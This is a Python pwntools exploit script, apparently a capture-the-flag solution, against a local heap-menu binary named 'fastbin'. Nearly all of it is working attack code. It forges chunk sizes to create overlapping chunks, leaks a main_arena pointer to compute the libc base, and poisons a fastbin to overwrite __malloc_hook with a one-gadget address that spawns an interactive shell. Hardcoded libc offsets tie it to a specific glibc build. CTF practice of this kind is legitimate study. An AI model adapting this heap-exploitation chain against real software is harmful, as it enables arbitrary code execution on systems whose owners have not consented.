#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './fastbin'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('Command: ', str(ch))

def add(size):
	menu(1)
	p.sendlineafter('Size: ', str(size))
	print "add a chunk success"

def edit(idx, content):
	menu(2)
	size = len(content)
	p.sendlineafter('Index: ', str(idx))
	p.sendlineafter('Size: ',str(size))
	p.sendlineafter('Content: ', content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(3)
	p.sendlineafter('Index: ', str(idx))
	print "free chunk %d success " % idx

def show(idx):
	menu(4)
	p.sendlineafter('Index: ', str(idx))


def exploit():
	add(0x30)			#0
	add(0x30)			#1
	add(0x30)			#2
	add(0x40)			#3
	add(0x20)			#4
	add(0x40)			#5

	free(3)
	#fake glibc, overlapping, into unsorted bin
	payload = 'a'*0x30 + p64(0x40) + p64(0x40*2 + 0x50 + 1)
	payload = payload.ljust(0xd0+0x30, 'p')
	payload += p64(0xd0) + p64(0x31)
	edit(0, payload)
	free(1)

	#allocte from unsorted bin to make main_arena to idx2
	add(0x30)						#1
	show(2)
	p.recvline()
	main_arena = u64(p.recv(6).ljust(8, '\x00')) - 0x58
	libc_base = main_arena - 0x3c4b20
	__free_hook = libc_base + libc.symbols['__free_hook']
	system = libc_base + libc.symbols['system']
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']
	gadget = libc_base + 0x4526a
	free(4)
	fakechunk = main_arena + 0xd					#fakechunk is above but near to top chunk

	#free idx3 into fastbin, while idx2 is still under control
	print "main_arena ==> " + hex(main_arena)	
	print "fakechunk ==> " + hex(fakechunk)
	edit(2, 'a'*0x30 + p64(0) + p64(0x51) + p64(fakechunk))
	add(0x40)			#3 padding

	add(0x40)			#4
	edit(4, '\x00'*0xb + p64(main_arena+0x28) + p64(0x61) + p64(0))

	add(0x50)			#6
	edit(6, '\x00'*0x20 + p64(__malloc_hook - 0x10) + p64(0x3c4b78+libc_base)*3)

	add(0x50)			#7
	edit(7, p64(gadget))

	gdb.attach(p)
	dbg()
	add(0x20)
	p.interactive()
	p.close()



#_IO_2_1_stdout_
if __name__ == '__main__':
	while 1:
		try:
			p = process('./fastbin')
			libc = elf.libc
			exploit()
		except:
			p.close()

